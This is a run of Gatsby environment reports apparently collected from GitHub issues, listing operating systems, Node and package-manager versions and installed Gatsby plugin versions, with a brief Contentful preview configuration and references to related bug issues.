this happens in both firefox and chrome system: os: macos 10.15.2 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 13.9.0 - /usr/local/bin/node yarn: 1.22.0 - /usr/local/bin/yarn npm: 6.13.7 - /usr/local/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 81.0.4044.122 firefox: 59.0.1 safari: 13.0.4 npmglobalpackages: gatsby: 2.15.14
system: os: macos 10.15.4 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.13.0 - ~/.nvm/versions/node/v12.13.0/bin/node yarn: 1.10.1 - /usr/local/bin/yarn npm: 6.12.0 - ~/.nvm/versions/node/v12.13.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.129 firefox: 75.0 safari: 13.1 npmpackages: gatsby: 2.21.1 => 2.21.1 gatsby-image: 2.4.0 => 2.4.0 gatsby-plugin-create-client-paths: 2.3.0 => 2.3.0 gatsby-plugin-manifest: 2.4.1 => 2.4.1 gatsby-plugin-module-resolver: 1.0.3 => 1.0.3 gatsby-plugin-offline: 3.2.0 => 3.2.0 gatsby-plugin-react-helmet: 3.3.0 => 3.3.0 gatsby-plugin-react-svg: ^2.1.2 => 2.1.2 gatsby-plugin-sharp: 2.6.0 => 2.6.0 gatsby-plugin-styled-components: 3.3.0 => 3.3.0 gatsby-plugin-typescript: 2.4.0 => 2.4.0 gatsby-source-filesystem: 2.3.0 => 2.3.0 gatsby-transformer-sharp: 2.5.0 => 2.5.0 npmglobalpackages: gatsby-cli: 2.8.15
system: os: windows 10 10.0.18363 cpu: (8) x64 intel(r) core(tm) i5-8250u cpu @ 1.60ghz binaries: node: 12.16.2 - c:\\program files\ odejs\ ode.exe npm: 6.14.4 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.17.4 => 2.17.4 gatsby-image: ^2.2.29 => 2.2.29 gatsby-plugin-manifest: ^2.2.23 => 2.2.23 gatsby-plugin-offline: ^3.0.16 => 3.0.16 gatsby-plugin-react-helmet: ^3.1.13 => 3.1.13 gatsby-plugin-sass: ^2.1.20 => 2.1.20 gatsby-plugin-sharp: ^2.2.32 => 2.2.32 gatsby-source-filesystem: ^2.1.33 => 2.1.33 gatsby-transformer-sharp: ^2.3.0 => 2.3.0 npmglobalpackages: gatsby-cli: 2.11.22
system: os: macos 10.15.3 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.15.3 - ~/.nvm/versions/node/v10.15.3/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.15.3/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.122 firefox: 75.0 safari: 13.0.5
system: os: macos 10.15.3 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.9.0 - /usr/local/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.13.7 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.122 firefox: 75.0 safari: 13.0.5 npmpackages: gatsby: ^2.21.1 => 2.21.1 gatsby-image: ^2.4.0 => 2.4.0 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-layout: ^1.3.0 => 1.3.0 gatsby-plugin-manifest: ^2.4.1 => 2.4.1 gatsby-plugin-offline: ^3.2.0 => 3.2.0 gatsby-plugin-react-helmet: ^3.3.0 => 3.3.0 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-sass: ^2.3.0 => 2.3.0 gatsby-plugin-sharp: ^2.6.0 => 2.6.0 gatsby-plugin-sitemap: ^2.4.0 => 2.4.0 gatsby-source-filesystem: ^2.3.0 => 2.3.0 gatsby-source-prismic-graphql: ^3.6.2 => 3.6.2 gatsby-transformer-sharp: ^2.5.0 => 2.5.0 npmglobalpackages: gatsby-cli: 2.4.8
system: os: linux 4.4 ubuntu 18.04.4 lts (bionic beaver) cpu: (4) x64 intel(r) core(tm) i7-6600u cpu @ 2.60ghz shell: 4.4.20 - /bin/bash binaries: node: 12.14.0 - ~/.nvm/versions/node/v12.14.0/bin/node yarn: 1.19.1 - ~/.yarn/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.14.0/bin/npm languages: python: 2.7.17 - /usr/bin/python npmpackages: gatsby: ^2.19.12 => 2.19.12 gatsby-image: ^2.2.34 => 2.2.40 gatsby-plugin-manifest: ^2.2.31 => 2.2.41 gatsby-plugin-offline: ^3.0.27 => 3.0.34 gatsby-plugin-react-helmet: ^3.1.16 => 3.1.22 gatsby-plugin-sharp: ^2.3.5 => 2.4.5 gatsby-remark-autolink-headers: ^2.1.21 => 2.1.24 gatsby-source-filesystem: ^2.1.40 => 2.1.48 gatsby-transformer-remark: ^2.6.50 => 2.6.50 gatsby-transformer-sharp: ^2.3.7 => 2.3.14
system: os: macos 10.15.2 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.0 - ~/.nvm/versions/node/v12.16.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.122 firefox: 75.0 safari: 13.0.4 npmpackages: gatsby: ^2.21.1 => 2.21.1 gatsby-image: ^2.4.0 => 2.4.0 gatsby-plugin-feed: ^2.5.0 => 2.5.0 gatsby-plugin-google-analytics: ^2.3.0 => 2.3.0 gatsby-plugin-manifest: ^2.4.0 => 2.4.1 gatsby-plugin-offline: ^3.2.0 => 3.2.0 gatsby-plugin-preact: ^3.3.0 => 3.3.0 gatsby-plugin-react-helmet: ^3.3.0 => 3.3.0 gatsby-plugin-sharp: ^2.6.0 => 2.6.0 gatsby-plugin-typography: ^2.5.0 => 2.5.0 gatsby-remark-copy-linked-files: ^2.3.0 => 2.3.1 gatsby-remark-images: ^3.3.0 => 3.3.0 gatsby-remark-prismjs: ^3.5.0 => 3.5.0 gatsby-remark-responsive-iframe: ^2.4.0 => 2.4.1 gatsby-remark-smartypants: ^2.3.0 => 2.3.0 gatsby-source-filesystem: ^2.3.0 => 2.3.0 gatsby-transformer-remark: ^2.8.0 => 2.8.0 gatsby-transformer-sharp: ^2.5.0 => 2.5.0
``` system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.2.0 - /usr/local/bin/node yarn: 1.19.1 - /usr/local/bin/yarn npm: 5.6.0 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.122 firefox: 70.0.1 safari: 13.1 npmpackages: gatsby: ^2.21.0 => 2.21.0 gatsby-image: ^2.4.0 => 2.4.0 gatsby-plugin-feed: ^2.5.0 => 2.5.0 gatsby-plugin-google-analytics: ^2.3.0 => 2.3.0 gatsby-plugin-manifest: ^2.4.0 => 2.4.0 gatsby-plugin-offline: ^3.2.0 => 3.2.0 gatsby-plugin-react-helmet: ^3.3.0 => 3.3.0 gatsby-plugin-sharp: ^2.6.0 => 2.6.0 gatsby-plugin-typography: ^2.5.0 => 2.5.0 gatsby-remark-copy-linked-files: ^2.3.0 => 2.3.0 gatsby-remark-images: ^3.3.0 => 3.3.0 gatsby-remark-prismjs: ^3.5.0 => 3.5.0 gatsby-remark-responsive-iframe: ^2.4.0 => 2.4.0 gatsby-remark-smartypants: ^2.3.0 => 2.3.0 gatsby-source-filesystem: ^2.3.0 => 2.3.0 gatsby-transformer-remark: ^2.8.0 => 2.8.0 gatsby-transformer-sharp: ^2.5.0 => 2.5.0
the same problem is on my local machine:
`gatsby info --clipboard` system: os: windows 10 10.0.18363 cpu: (8) x64 intel(r) core(tm) i5-8350u cpu @ 1.70ghz binaries: node: 12.13.0 - c:\\program files\ odejs\ ode.exe yarn: 1.21.1 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.12.0 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.17 browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.20.36 => 2.20.36 gatsby-cli: ^2.11.22 => 2.11.22 gatsby-plugin-catch-links: ^2.0.4 => 2.2.1 gatsby-plugin-google-analytics: ^2.0.6 => 2.2.2 gatsby-plugin-google-fonts: latest => 1.0.1 gatsby-plugin-react-helmet: ^3.0.0 => 3.2.1 gatsby-plugin-sass: ^2.0.1 => 2.2.1 gatsby-plugin-sharp: ^2.5.3 => 2.5.3 gatsby-plugin-sitemap: ^2.0.1 => 2.3.1
` system: os: macos 10.15.4 cpu: (4) x64 intel(r) core(tm) i5-5250u cpu @ 1.60ghz shell: 3.2.57 - /bin/bash binaries: node: 12.13.0 - /usr/local/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 6.12.0 - /usr/local/bin/npm languages: python: 2.7.12 - /library/frameworks/python.framework/versions/2.7/bin/python browsers: chrome: 81.0.4044.122 firefox: 75.0 safari: 13.1 npmpackages: gatsby: ^2.19.7 => 2.21.0 gatsby-image: ^2.2.39 => 2.4.0 gatsby-plugin-manifest: ^2.2.39 => 2.4.0 gatsby-plugin-offline: ^3.0.32 => 3.2.0 gatsby-plugin-react-helmet: ^3.1.21 => 3.3.0 gatsby-plugin-sharp: ^2.4.3 => 2.6.0 gatsby-plugin-styled-components: ^3.2.1 => 3.3.0 gatsby-source-contentful: ^2.2.7 => 2.3.0 gatsby-source-filesystem: ^2.1.46 => 2.3.0 gatsby-transformer-sharp: ^2.3.13 => 2.5.0 `
system: os: macos high sierra 10.13.6 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 5.3 - /bin/zsh binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node yarn: 1.16.0 - ~/.yarn/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 81.0.4044.122 firefox: 74.0.1 safari: 12.0 npmpackages: gatsby: ^2.20.12 => 2.20.12 gatsby-image: ^2.3.1 => 2.3.1 gatsby-plugin-material-ui: ^2.1.6 => 2.1.6 gatsby-plugin-s3: ^0.3.3 => 0.3.3 gatsby-plugin-sharp: ^2.5.3 => 2.5.3 gatsby-plugin-typography: ^2.4.1 => 2.4.1 gatsby-source-contentful: ^2.2.7 => 2.2.7
system: os: macos 10.15.3 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.11.0 - ~/.nvm/versions/node/v12.11.0/bin/node yarn: 1.22.4 - ~/.nvm/versions/node/v12.11.0/bin/yarn npm: 6.11.3 - ~/.nvm/versions/node/v12.11.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.122 firefox: 75.0 safari: 13.0.5 npmpackages: gatsby: ^2.20.36 => 2.20.36 gatsby-plugin-mdx: ^1.1.11 => 1.1.11 gatsby-source-filesystem: ^2.3.0 => 2.3.0 npmglobalpackages: gatsby-cli: 2.8.27
system: os: macos 10.15.2 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.16.3 - /usr/local/bin/node yarn: 1.22.0 - /usr/local/bin/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.122 firefox: 73.0.1 safari: 13.0.4 npmpackages: gatsby: ^2.20.25 => 2.20.25 gatsby-image: ^2.3.4 => 2.3.4 gatsby-plugin-manifest: ^2.3.5 => 2.3.5 gatsby-plugin-material-ui: ^2.1.6 => 2.1.6 gatsby-plugin-offline: ^3.1.4 => 3.1.4 gatsby-plugin-react-helmet: ^3.2.4 => 3.2.4 gatsby-plugin-sharp: ^2.5.6 => 2.5.6 gatsby-plugin-styled-components: ^3.2.4 => 3.2.4 gatsby-source-filesystem: ^2.2.4 => 2.2.4 gatsby-theme-material-ui: ^1.0.8 => 1.0.8 gatsby-transformer-sharp: ^2.4.6 => 2.4.6 npmglobalpackages: gatsby-cli: 2.11.15
system: os: macos 10.15.4 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.122 firefox: 75.0 safari: 13.1 npmpackages: gatsby: ^2.20.25 => 2.20.25 gatsby-image: ^2.3.4 => 2.3.4 gatsby-plugin-manifest: ^2.3.5 => 2.3.5 gatsby-plugin-offline: ^3.1.4 => 3.1.4 gatsby-plugin-react-helmet: ^3.2.4 => 3.2.4 gatsby-plugin-sharp: ^2.5.6 => 2.5.6 gatsby-source-filesystem: ^2.2.4 => 2.2.4 gatsby-transformer-sharp: ^2.4.6 => 2.4.6
``` system: os: macos 10.15.3 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.12.0 - /usr/local/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.122 firefox: 75.0 safari: 13.0.5 npmpackages: gatsby: ^2.20.36 => 2.20.36 gatsby-image: ^2.2.19 => 2.3.5 gatsby-plugin-catch-links: ^2.1.9 => 2.2.4 gatsby-plugin-client-side-redirect: 0.0.2 => 0.0.2 gatsby-plugin-emotion: ^4.1.18 => 4.2.3 gatsby-plugin-google-analytics: ^2.1.16 => 2.2.5 gatsby-plugin-manifest: ^2.2.16 => 2.3.7 gatsby-plugin-mdx: ^1.1.5 => 1.1.11 gatsby-plugin-offline: ^3.0.7 => 3.1.5 gatsby-plugin-preact: ^3.2.4 => 3.2.4 gatsby-plugin-react-helmet: ^3.1.7 => 3.2.5 gatsby-plugin-sharp: ^2.2.22 => 2.5.7 gatsby-redirect-from: ^0.2.1 => 0.2.1 gatsby-remark-autolink-headers: ^2.1.10 => 2.2.4 gatsby-remark-vscode: ^2.0.3 => 2.0.3 gatsby-source-filesystem: ^2.1.22 => 2.2.5 gatsby-transformer-remark: ^2.6.22 => 2.7.5 gatsby-transformer-sharp: ^2.2.14 => 2.4.7
<details> ``` system: os: macos 10.15.4 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.0.0 - /usr/local/bin/node npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.122 safari: 13.1 npmpackages: gatsby: ^2.20.36 => 2.20.36 gatsby-plugin-mdx: ^1.1.11 => 1.1.11 gatsby-source-filesystem: ^2.2.5 => 2.2.5 ``` </details>
``` system: os: linux 5.6 opensuse tumbleweed 20200405 cpu: (8) x64 intel(r) core(tm) i7-8565u cpu @ 1.80ghz shell: 5.0.16 - /bin/bash binaries: node: 12.16.1 - /usr/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.2 - /usr/local/bin/npm languages: python: 2.7.17 - /usr/bin/python npmpackages: gatsby: ^2.20.29 => 2.20.29 gatsby-background-image: ^1.1.1 => 1.1.1 gatsby-image: ^2.3.4 => 2.3.4 gatsby-plugin-catch-links: ^2.2.3 => 2.2.3 gatsby-plugin-manifest: ^2.3.6 => 2.3.6 gatsby-plugin-offline: ^3.1.4 => 3.1.4 gatsby-plugin-preact: ^3.2.3 => 3.2.3 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.2.4 => 3.2.4 gatsby-plugin-sass: ^2.2.3 => 2.2.3 gatsby-plugin-sharp: ^2.5.6 => 2.5.6 gatsby-remark-copy-linked-files: ^2.2.3 => 2.2.3 gatsby-remark-images: ^3.2.5 => 3.2.5 gatsby-remark-relative-images: ^0.3.0 => 0.3.0 gatsby-source-filesystem: ^2.2.2 => 2.2.2 gatsby-source-wordpress: ^3.2.2 => 3.2.2 gatsby-transformer-remark: ^2.7.4 => 2.7.4 gatsby-transformer-sharp: ^2.4.6 => 2.4.6 npmglobalpackages: gatsby-cli: 2.11.1
``` binaries: node: 12.16.2 - /usr/local/opt/node@12/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - /usr/local/opt/node@12/bin/npm npmpackages: gatsby: ^2.20.31 => 2.20.31 gatsby-image: ^2.3.5 => 2.3.5 gatsby-plugin-layout: ^1.2.4 => 1.2.4 gatsby-plugin-lodash: ^3.2.4 => 3.2.4 gatsby-plugin-preact: ^3.2.4 => 3.2.4 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.2.5 => 3.2.5 gatsby-plugin-sass: ^2.2.4 => 2.2.4 gatsby-plugin-sharp: ^2.5.7 => 2.5.7 gatsby-source-contentful: ~2.1.88 => 2.1.100 gatsby-source-filesystem: ^2.2.5 => 2.2.5 gatsby-transformer-sharp: ^2.4.7 => 2.4.7 npmglobalpackages: gatsby-cli: 2.11.17
system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 5.3 - /bin/zsh binaries: node: 12.6.0 - ~/.nvm/versions/node/v12.6.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.13.1 - ~/.nvm/versions/node/v12.6.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 81.0.4044.122 firefox: 57.0.4 safari: 12.1.2 npmpackages: gatsby: ^2.18.10 => 2.20.29 gatsby-cli: ^2.11.15 => 2.11.15 gatsby-image: ^2.2.36 => 2.3.4 gatsby-plugin-netlify: ^2.1.30 => 2.2.3 gatsby-plugin-sharp: ^2.3.7 => 2.5.6 gatsby-source-filesystem: ^2.1.42 => 2.2.4 gatsby-source-graphql: ^2.1.28 => 2.4.2 gatsby-transformer-sharp: ^2.3.9 => 2.4.6 npmglobalpackages: gatsby-cli: 2.11.7 gatsby: 2.20.29
system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 5.3 - /bin/zsh binaries: node: 12.6.0 - ~/.nvm/versions/node/v12.6.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.13.1 - ~/.nvm/versions/node/v12.6.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 81.0.4044.122 firefox: 57.0.4 safari: 12.1.2 npmpackages: gatsby: ^2.18.10 => 2.20.29 gatsby-cli: ^2.11.15 => 2.11.15 gatsby-image: ^2.2.36 => 2.3.4 gatsby-plugin-netlify: ^2.1.30 => 2.2.3 gatsby-plugin-sharp: ^2.3.7 => 2.5.6 gatsby-source-filesystem: ^2.1.42 => 2.2.4 gatsby-source-graphql: ^2.1.28 => 2.4.2 gatsby-transformer-sharp: ^2.3.9 => 2.4.6 npmglobalpackages: gatsby-cli: 2.11.7 gatsby: 2.20.29
<details> ``` system: os: linux 5.4 ubuntu 20.04 lts (focal fossa) cpu: (4) x64 intel(r) core(tm) i7-6500u cpu @ 2.50ghz shell: 5.8 - /usr/bin/zsh binaries: node: 12.16.2 - ~/.nvm/versions/node/v12.16.2/bin/node npm: 6.14.4 - ~/.nvm/versions/node/v12.16.2/bin/npm languages: python: 2.7.18 - /usr/bin/python browsers: firefox: 76.0b7 npmpackages: gatsby: ~2.20.29 => 2.20.29 gatsby-image: ~2.3.4 => 2.3.4 gatsby-plugin-google-analytics: ~2.2.4 => 2.2.4 gatsby-plugin-manifest: ~2.3.6 => 2.3.6 gatsby-plugin-material-ui: ~2.1.6 => 2.1.6 gatsby-plugin-modal-routing: ^1.1.0 => 1.1.0 gatsby-plugin-netlify: ~2.2.3 => 2.2.3 gatsby-plugin-netlify-cms: ~4.2.4 => 4.2.4 gatsby-plugin-offline: ~3.1.4 => 3.1.4 gatsby-plugin-react-helmet: ~3.2.4 => 3.2.4 gatsby-plugin-remove-serviceworker: ~1.0.0 => 1.0.0 gatsby-plugin-robots-txt: ~1.5.0 => 1.5.0 gatsby-plugin-sharp: ~2.5.6 => 2.5.6 gatsby-plugin-sitemap: ~2.3.5 => 2.3.5 gatsby-plugin-uninline-styles: ~0.2.0 => 0.2.0 gatsby-plugin-web-font-loader: ~1.0.4 => 1.0.4 gatsby-remark-external-links: 0.0.4 => 0.0.4 gatsby-source-filesystem: ~2.2.4 => 2.2.4 gatsby-transformer-json: ~2.3.3 => 2.3.3 gatsby-transformer-remark: ~2.7.4 => 2.7.4 gatsby-transformer-sharp: ~2.4.6 => 2.4.6 npmglobalpackages: gatsby-transformer-remark: 2.7.4 gatsby: 2.20.27
``` </details>
configure `gatsby-source-contentful` to use preview api ``` { resolve: `gatsby-source-contentful`, options: { spaceid: `...`, accesstoken: process.env.contentful_access_token, host: `preview.contentful.com`, },
``` run `gatsby develop`
system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i7-3635qm cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.16.3 - ~/.nvm/versions/node/v10.16.3/bin/node yarn: 1.22.0 - /usr/local/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v10.16.3/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.122 firefox: 75.0 safari: 13.1 npmpackages: gatsby: ^2.20.22 => 2.20.29 gatsby-cli: ^2.11.8 => 2.11.15 gatsby-image: ^2.3.2 => 2.3.4 gatsby-plugin-manifest: 2.3.3 => 2.3.3 gatsby-plugin-offline: 3.1.2 => 3.1.2 gatsby-plugin-postcss: 2.2.1 => 2.2.1 gatsby-plugin-purgecss: 5.0.0 => 5.0.0 gatsby-plugin-react-helmet: 3.2.2 => 3.2.2 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sharp: ^2.5.3 => 2.5.6 gatsby-plugin-sitemap: ^2.3.2 => 2.3.5 gatsby-source-filesystem: ^2.2.2 => 2.2.4 gatsby-source-instagram: ^0.7.0 => 0.7.0 gatsby-transformer-sharp: ^2.4.3 => 2.4.6 npmglobalpackages: gatsby-cli: 2.11.13
``` system: os: linux 4.15 ubuntu 18.04.4 lts (bionic beaver) cpu: (4) x64 intel(r) core(tm) i5-7200u cpu @ 2.50ghz shell: 4.4.20 - /bin/bash binaries: node: 10.14.2 - ~/.nvm/versions/node/v10.14.2/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.14.2/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 81.0.4044.113 firefox: 75.0 npmpackages: gatsby: ^2.3.16 => 2.20.29 gatsby-image: ^2.0.37 => 2.3.4 gatsby-plugin-feed: ^2.1.0 => 2.4.3 gatsby-plugin-google-analytics: ^2.0.18 => 2.2.4 gatsby-plugin-manifest: ^2.0.28 => 2.3.6 gatsby-plugin-offline: ^2.0.25 => 2.2.10 gatsby-plugin-react-helmet: ^3.0.12 => 3.2.4 gatsby-plugin-sass: ^2.1.17 => 2.2.3 gatsby-plugin-sharp: ^2.0.32 => 2.5.6 gatsby-plugin-typography: ^2.2.12 => 2.4.3 gatsby-remark-copy-linked-files: ^2.0.11 => 2.2.3 gatsby-remark-images: ^2.0.6 => 2.0.6 gatsby-remark-prismjs: ^3.2.8 => 3.4.4 gatsby-remark-responsive-iframe: ^2.1.1 => 2.3.3 gatsby-remark-smartypants: ^2.0.9 => 2.2.3 gatsby-source-filesystem: ^2.0.29 => 2.2.4 gatsby-transformer-remark: ^2.3.8 => 2.7.4 gatsby-transformer-sharp: ^2.1.17 => 2.4.6 npmglobalpackages: gatsby-cli: 2.5.6
<summary>details</summary> system: os: linux 4.15 ubuntu 18.04.2 lts (bionic beaver) cpu: (4) x64 intel(r) core(tm) i7-7500u cpu @ 2.70ghz shell: 5.4.2 - /bin/zsh binaries: node: 12.10.0 - ~/.nvm/versions/node/v12.10.0/bin/node yarn: 1.12.3 - /usr/bin/yarn npm: 6.13.7 - ~/.nvm/versions/node/v12.10.0/bin/npm languages: python: 3.6.5 - /home/ir1d/anaconda3/bin/python browsers: chrome: 80.0.3987.122 firefox: 75.0 npmglobalpackages: gatsby-cli: 2.8.27
browser ### additional info
there are set of already similar issues #19849 , #22733.
#19452 talks about intermittent failure of screenshot causing similar issue.
"gatsby-starter-prologue" starter mentioned in above issue is available and runs on github-pages, which *may be* screenshot failed issue
a similar fix was tried on
``` system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 3.2.57 - /bin/bash binaries: node: 10.18.0 - ~/.nvm/versions/node/v10.18.0/bin/node yarn: 1.21.1 - ~/.nvm/versions/node/v10.18.0/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v10.18.0/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 81.0.4044.113 firefox: 75.0 safari: 13.1 npmpackages: gatsby: ^2.20.23 => 2.20.23 gatsby-plugin-algolia: ^0.7.0 => 0.7.0 gatsby-plugin-anchor-links: ^1.1.1 => 1.1.1 gatsby-plugin-breadcrumb: ^9.0.1 => 9.0.1 gatsby-plugin-catch-links: ^2.2.2 => 2.2.2 gatsby-plugin-dark-mode: ^1.1.1 => 1.1.1 gatsby-plugin-less: ^3.1.2 => 3.1.2 gatsby-plugin-manifest: ^2.3.4 => 2.3.4 gatsby-plugin-mdx: ^1.1.8 => 1.1.8 gatsby-plugin-meta-redirect: ^1.1.1 => 1.1.1 gatsby-plugin-react-helmet: ^3.2.3 => 3.2.3 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-sharp: ^2.5.5 => 2.5.5 gatsby-plugin-smoothscroll: ^1.1.0 => 1.1.0 gatsby-redirect-from: ^0.2.1 => 0.2.1 gatsby-remark-autolink-headers: ^2.2.2 => 2.2.2 gatsby-remark-code-buttons: ^2.0.4 => 2.0.4 gatsby-remark-copy-linked-files: ^2.2.3 => 2.2.3 gatsby-remark-embed-markdown: 0.0.4 => 0.0.4 gatsby-remark-embed-snippet: ^4.2.3 => 4.2.3 gatsby-remark-external-links: ^0.0.4 => 0.0.4 gatsby-remark-images: ^3.2.3 => 3.2.3 gatsby-remark-images-medium-zoom: ^1.5.0 => 1.5.0 gatsby-remark-prismjs: ^3.4.2 => 3.4.2 gatsby-remark-relative-images: ^0.3.0 => 0.3.0 gatsby-source-filesystem: ^2.2.3 => 2.2.3 gatsby-transformer-remark: ^2.7.2 => 2.7.2 gatsby-transformer-sharp: ^2.4.5 => 2.4.5 gatsby-transformer-yaml-full: ^0.2.0 => 0.2.0 gatsby-transformer-yaml-plus: ^0.2.2 => 0.2.2 gatsby-yaml-full-file: ^0.2.0 => 0.2.0 gatsby-yaml-full-markdown: ^0.2.1 => 0.2.1
``` system: os: windows 10 10.0.18362 cpu: (8) x64 intel(r) core(tm) i7-4790 cpu @ 3.60ghz binaries: node: 12.10.0 - e:\\program files\ odejs\ ode.exe yarn: 1.21.1 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.10.3 - e:\\program files\ odejs\ pm.cmd languages: python: 2.7.14 - /c/python27/python browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.20.26 => 2.20.26 gatsby-background-image: ^1.1.1 => 1.1.1 gatsby-image: ^2.3.4 => 2.3.4 gatsby-plugin-env-variables: ^1.0.1 => 1.0.1 gatsby-plugin-excerpts: ^1.0.2 => 1.1.0 gatsby-plugin-google-analytics: ^2.2.4 => 2.2.4 gatsby-plugin-manifest: ^2.3.5 => 2.3.5 gatsby-plugin-netlify: ^2.2.3 => 2.2.3 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-netlify-cms: ^4.2.4 => 4.2.4 gatsby-plugin-offline: ^3.1.4 => 3.1.4 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-purgecss: ^5.0.0 => 5.0.0 gatsby-plugin-react-helmet: ^3.2.4 => 3.2.4 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sass: ^2.2.3 => 2.2.3 gatsby-plugin-sharp: ^2.5.6 => 2.5.6 gatsby-plugin-sitemap: ^2.3.5 => 2.3.5 gatsby-plugin-tawk: ^1.0.0 => 1.0.0 gatsby-remark-copy-linked-files: ^2.2.3 => 2.2.3 gatsby-remark-custom-blocks: ^2.2.3 => 2.2.3 gatsby-remark-images: ^3.2.4 => 3.2.4 gatsby-remark-relative-images: ^0.3.0 => 0.3.0 gatsby-source-filesystem: ^2.2.4 => 2.2.4 gatsby-transformer-remark: ^2.7.3 => 2.7.3 gatsby-transformer-sharp: ^2.4.6 => 2.4.6 ```
